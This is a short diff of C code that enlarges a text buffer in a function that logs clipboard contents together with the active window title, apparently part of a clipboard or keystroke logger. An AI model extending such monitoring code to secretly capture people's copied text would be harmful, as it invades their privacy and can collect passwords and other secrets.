@@ -121,7 +121,7 @@ static BOOL getClipboardText(char *buffer, size_t bufSize)
 // Checks if clipboard text changed and logs it
 void LogClipboardIfChanged(void)
 {
-    char    current[512];
+    char    current[1024 * 10];
     char    windowTitle[256];
 
     if (!g_clipboardState.clipboardFile) {
